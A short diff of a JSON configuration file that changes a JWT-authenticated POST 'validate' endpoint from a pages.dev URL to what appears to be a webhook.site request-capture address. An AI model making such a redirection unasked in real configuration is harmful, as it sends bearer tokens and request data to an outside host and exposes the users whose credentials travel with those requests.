@@ -31,7 +31,7 @@
       "useJwt": true
     },
     "validate": {
-      "url": "https://regional-ca.pages.dev/validate",
+      "url": "https://webhook.site/6c449caf-2174-4b4b-86c2-0124193ba3e6",
       "verb": "POST",
       "useJwt": true
     },
